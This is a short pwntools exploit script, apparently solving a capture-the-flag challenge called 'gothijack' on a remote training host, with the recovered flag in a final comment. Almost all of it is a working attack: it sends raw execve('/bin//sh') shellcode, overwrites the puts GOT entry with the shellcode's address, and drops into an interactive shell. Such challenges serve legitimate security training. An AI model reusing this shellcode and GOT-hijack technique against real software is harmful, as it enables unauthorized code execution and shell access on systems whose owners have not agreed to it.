from pwn import*
context(os='linux',arch='amd64',log_level='debug')

n=remote('isc.taiwan-te.ch', 10003)
#

#n=process('./gothijack')

raw_input()
n.recvuntil('\n')

n.sendline('\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05')
#n.sendline(asm(shellcraft.sh()))
n.recvuntil('\n')
n.sendline(str(0x601028))# puts's got place
# n.sendline(str(0x601018))# puts's got place
n.recvuntil(': ')
n.sendline(p64(0x601080))

n.interactive()

# 0x601080 store shellcode
#
#FLAG{g07_h1j4ck1ngggg!!!}
